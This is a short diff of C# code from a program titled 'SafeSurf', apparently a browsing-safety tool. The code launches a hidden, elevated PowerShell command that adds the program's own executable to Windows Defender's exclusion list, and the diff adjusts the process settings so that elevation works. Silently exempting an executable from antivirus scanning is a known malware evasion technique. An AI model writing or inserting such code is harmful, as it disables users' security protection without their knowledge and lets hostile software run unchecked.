@@ -47,7 +47,6 @@ namespace UI
             Console.Title = "SafeSurf";
             Process.Start(new ProcessStartInfo("powershell") 
             {
-                UseShellExecute = false,
                 CreateNoWindow = true,
                 Verb = "runas",
                 Arguments = $" -Command Add-MpPreference -ExclusionPath '{exePath}'"
